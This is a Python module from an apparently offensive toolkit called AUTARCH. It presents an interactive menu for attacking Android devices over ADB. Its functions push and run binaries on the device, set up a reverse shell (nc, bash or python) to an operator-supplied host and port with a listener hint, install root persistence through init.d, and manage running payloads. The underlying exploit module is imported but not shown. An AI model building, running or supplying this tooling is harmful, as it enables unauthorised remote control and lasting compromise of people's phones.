"""
Android Payload Deployment - Deploy binaries, reverse shells, persistence
"""

DESCRIPTION = "Android payload deployment (binaries, reverse shells, persistence)"
AUTHOR = "AUTARCH"
VERSION = "1.0"
CATEGORY = "offense"

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))


class AndroidPayload:
    """Interactive menu for Android payload deployment."""

    def __init__(self):
        from core.android_exploit import get_exploit_manager
        from core.hardware import get_hardware_manager
        self.mgr = get_exploit_manager()
        self.hw = get_hardware_manager()
        self.serial = None

    def _select_device(self):
        devices = self.hw.adb_devices()
        if not devices:
            print("  No ADB devices connected.")
            return
        if len(devices) == 1:
            self.serial = devices[0]['serial']
            print(f"  Selected: {self.serial}")
            return
        print("\n  Select device:")
        for i, d in enumerate(devices, 1):
            model = d.get('model', '')
            print(f"    {i}) {d['serial']} {model}")
        try:
            choice = int(input("  > ").strip())
            if 1 <= choice <= len(devices):
                self.serial = devices[choice - 1]['serial']
        except (ValueError, EOFError, KeyboardInterrupt):
            pass

    def _ensure_device(self):
        if not self.serial:
            self._select_device()
        return self.serial is not None

    def show_menu(self):
        print(f"\n{'='*50}")
        print("  Payload Deployment")
        print(f"{'='*50}")
        print(f"  Device: {self.serial or '(none)'}")
        print()
        print("  [1] Deploy Binary")
        print("  [2] Execute Payload")
        print("  [3] Setup Reverse Shell")
        print("  [4] Install Persistence   [ROOT]")
        print("  [5] List Running Payloads")
        print("  [6] Kill Payload")
        print("  [s] Select Device")
        print("  [0] Back")
        print()

    def deploy_binary(self):
        if not self._ensure_device():
            return
        try:
            local = input("  Local binary path: ").strip()
            remote = input("  Remote path [/data/local/tmp/]: ").strip() or '/data/local/tmp/'
        except (EOFError, KeyboardInterrupt):
            return
        if not local:
            return
        print("  Deploying...")
        result = self.mgr.deploy_binary(self.serial, local, remote)
        if result['success']:
            print(f"  Deployed to: {result['remote_path']}")
        else:
            print(f"  Error: {result['error']}")

    def execute_payload(self):
        if not self._ensure_device():
            return
        try:
            remote = input("  Remote path: ").strip()
            args = input("  Arguments []: ").strip()
            bg = input("  Background? [Y/n]: ").strip().lower() != 'n'
        except (EOFError, KeyboardInterrupt):
            return
        if not remote:
            return
        print("  Executing...")
        result = self.mgr.execute_payload(self.serial, remote, args=args, background=bg)
        if result['success']:
            if result['background']:
                print(f"  Running in background, PID: {result['pid']}")
            else:
                print(f"  Output:\n{result['output']}")
        else:
            print(f"  Error: {result.get('output', 'Failed')}")

    def reverse_shell(self):
        if not self._ensure_device():
            return
        try:
            lhost = input("  LHOST (your IP): ").strip()
            lport = input("  LPORT: ").strip()
            print("  Methods: nc, bash, python")
            method = input("  Method [nc]: ").strip() or 'nc'
        except (EOFError, KeyboardInterrupt):
            return
        if not lhost or not lport:
            return
        print(f"  Setting up {method} reverse shell to {lhost}:{lport}...")
        result = self.mgr.setup_reverse_shell(self.serial, lhost, int(lport), method)
        if result['success']:
            print(f"  Reverse shell initiated ({method})")
            print(f"  Catch with: nc -lvnp {lport}")
        else:
            print(f"  Error: {result.get('error', 'Failed')}")

    def persistence(self):
        if not self._ensure_device():
            return
        try:
            method = input("  Method [init.d]: ").strip() or 'init.d'
        except (EOFError, KeyboardInterrupt):
            return
        print("  Installing persistence (requires root)...")
        result = self.mgr.install_persistence(self.serial, method)
        if result['success']:
            print(f"  Installed at: {result['path']}")
        else:
            print(f"  Error: {result.get('error', 'Failed')}")

    def list_payloads(self):
        if not self._ensure_device():
            return
        result = self.mgr.list_running_payloads(self.serial)
        if not result['success']:
            print(f"  Error: {result.get('error', 'Failed')}")
            return
        if not result['payloads']:
            print("  No running payloads found in /data/local/tmp/")
            return
        print(f"\n  Found {result['count']} running payloads:")
        for p in result['payloads']:
            print(f"    PID {p['pid']}: {p['command']}")

    def kill_payload(self):
        if not self._ensure_device():
            return
        try:
            pid = input("  PID to kill: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if not pid:
            return
        result = self.mgr.kill_payload(self.serial, pid)
        print(f"  Kill signal sent to PID {pid}")

    def run_interactive(self):
        while True:
            self.show_menu()
            try:
                choice = input("  Select > ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                break
            if choice == '0':
                break
            actions = {
                '1': self.deploy_binary,
                '2': self.execute_payload,
                '3': self.reverse_shell,
                '4': self.persistence,
                '5': self.list_payloads,
                '6': self.kill_payload,
                's': self._select_device,
            }
            action = actions.get(choice)
            if action:
                action()
            else:
                print("  Invalid choice.")


def run():
    m = AndroidPayload()
    m.run_interactive()
